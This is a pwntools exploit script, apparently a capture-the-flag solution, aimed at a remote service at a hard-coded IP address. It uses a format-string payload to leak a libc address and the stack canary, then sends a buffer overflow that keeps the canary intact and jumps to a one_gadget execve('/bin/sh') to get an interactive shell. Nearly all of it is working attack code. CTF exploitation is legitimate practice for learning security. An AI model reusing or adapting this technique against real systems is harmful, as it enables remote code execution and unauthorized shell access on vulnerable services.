
from pwn import *


def fun(r):
    r.sendline('1')
    r.recvuntil('rocks)\n')
    r.sendline('2')
    r.recvuntil('Kryptonite?\n')
    r.sendline('%3$p %13$p %19$p')
    l = r.readline().split()
    r.recvuntil('food\n')
    return l


def fun1(r, s):
    r.sendline('1')
    r.recvuntil('rocks)\n')
    r.sendline('2')
    r.recvuntil('Kryptonite?\n')
    r.sendline('%3$p %13$p %19$p')
    r.recvuntil('it?\n')
    r.sendline(s)


r = remote('165.232.47.168', 31612)

libc = ELF('./libc6_2.27-3ubuntu1.2_amd64.so', checksec=False)

libc_read = libc.sym['read']

r.recvuntil('food\n')

leak = fun(r)

LIBC_BASE = int(leak[0], 16) - 17 - libc_read
CANARY = int(leak[1], 16)
ONE_GADGET = 0x4f365

log.info("LIBC_BASE    = 0x{:02x}".format(LIBC_BASE))
log.info("CANARY       = 0x{:02x}".format(CANARY))

for _ in range(7):
    fun(r)

p = b'A' * 0x18
p += p64(CANARY) * 2
p += p64(LIBC_BASE + ONE_GADGET)

fun1(r, p)

r.interactive()

# 0x4f365 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   rsp & 0xf == 0
#   rcx == NULL
